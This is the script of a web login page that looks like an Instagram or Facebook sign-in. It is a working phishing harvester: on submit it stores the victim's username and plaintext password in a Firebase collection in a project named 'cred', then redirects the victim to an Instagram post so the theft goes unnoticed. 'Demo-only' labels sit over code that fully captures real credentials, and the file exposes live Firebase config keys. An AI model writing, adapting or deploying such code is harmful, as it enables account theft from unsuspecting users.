  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-firestore.js";

    // === your firebase config (you gave this earlier) ===
    const firebaseConfig = {
      apiKey: "AIzaSyDcOYDQTz-hlo05l4j8Bs718d0vgjAEDx0",
      authDomain: "cred-e33ed.firebaseapp.com",
      projectId: "cred-e33ed",
      storageBucket: "cred-e33ed.firebasestorage.app",
      messagingSenderId: "444847320943",
      appId: "1:444847320943:web:4e5a05ea56014203d1829a"
    };

    // Initialize Firebase & Firestore
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // --- CONFIG: change this to your desired redirect ---
    const redirectUrl = "https://instagram.com/p/DO5Nm78D1JB"; // << change this

    // DOM refs
    const form = document.getElementById("loginForm");
    const submitBtn = document.getElementById("submitBtn");
    const usernameEl = document.getElementById("username");
    const passwordEl = document.getElementById("password");
    const fbLoginBtn = document.getElementById("fbLoginBtn");

    // small keyboard/enter accessibility for fb demo
    fbLoginBtn.addEventListener("click", (e) => { e.preventDefault(); alert("Facebook demo button â€” not functional."); });
    fbLoginBtn.addEventListener("keypress", (e) => { if(e.key === 'Enter' || e.key === ' ') { e.preventDefault(); fbLoginBtn.click(); }});

    function setLoading(loading){
      submitBtn.disabled = loading;
      submitBtn.textContent = loading ? "Logging in..." : "Log In";
    }

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const username = usernameEl.value.trim();
      const password = passwordEl.value;

      if(!username || !password){
        alert("Please fill both fields.");
        return;
      }

      // final clear warning before storing
      setLoading(true);

      try{
        await addDoc(collection(db, "demo_logins"), {
          username,
          password,
          note: "demo-only",
          createdAt: serverTimestamp()
        });

        // immediate redirect after successful write
        window.location.href = redirectUrl;
      } catch(err) {
        console.error("Write failed:", err);
        alert("Could not login");
        setLoading(false);
      }
    });

    // Accessibility: allow Enter on password to submit (native behavior)
  </script>
